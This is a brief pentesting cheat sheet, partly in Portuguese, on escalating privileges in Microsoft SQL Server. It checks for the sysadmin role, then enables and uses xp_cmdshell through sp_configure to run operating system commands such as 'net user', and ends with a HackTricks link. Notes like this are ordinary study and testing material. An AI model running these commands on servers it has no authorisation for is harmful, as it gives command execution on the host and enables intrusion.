# MSsql Escalation

## Check what is role on the server

	SELECT is_srvrolemember('sysadmin');

Se o resultad for 1 quer dizer que somos sysadmin

## Try to get access to xp_cmdshell

This allows us to execute commands. First check if we already can run the script

	 EXEC xp_cmdshell 'net user';

If we cant use it we need to activate it.

	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;



## Relevant Information

	https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server